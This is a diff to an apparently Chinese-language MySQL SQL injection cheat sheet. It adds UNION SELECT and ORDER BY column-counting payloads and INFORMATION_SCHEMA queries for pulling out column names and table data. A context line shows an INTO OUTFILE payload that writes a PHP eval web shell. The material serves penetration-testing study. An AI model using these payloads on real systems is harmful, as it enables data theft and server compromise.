@@ -58,7 +58,7 @@ copyright: true
 
 ## 注释
 ### 行间注释
-+ --   (--后面有个空格)
++ -- -  (--后面有个空格)
 	+ DROP sampletable;--
 + #
 	+ DROP sampletable;#
@@ -91,6 +91,22 @@ chybeta.php?id=1" and "1"="1
 ```
 
 ## 联合查询
+### 查询列数
+用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。
+#### UNION SELECT
+```
+UNION SELECT 1,2,3 #
+UNION ALL SELECT 1,2,3 #
+UNION ALL SELECT null,null,null #
+```
+#### ORDER BY
+利用二分法
+```
+ORDER BY 10 #
+ORDER BY 5  #
+ORDER BY 2  #
+....
+```
 ### 查询数据库
 ```
 UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA #
@@ -104,8 +120,13 @@ UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHE
 UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 #
 ```
 ### 查询列名
+由前一步获取到表名为tablename后，对其进行十六进制编码得到
 ```
-
+UNION SELECT GROUP_CONCAT(column_name SEPARATOR+0x3c62723e) FROM+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7461626c656e616d65 #
+```
+### 获取数据
+```
+UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasename.tablename #
 ```
 ## insert/update/delete注入
 ## order by注入
@@ -184,3 +205,4 @@ UNION SELECT  "<?php eval($_POST['chybeta'])?>" INTO OUTFILE 'C:/phpstudy/WWW/te
 # 参考
 + [MySQL_Testing_Injection](http://websec.ca/kb/sql_injection#MySQL_Testing_Injection)
 + [MySQL SQL Injection Cheat Sheet](http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/)
++ [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#Enablecmdshell)
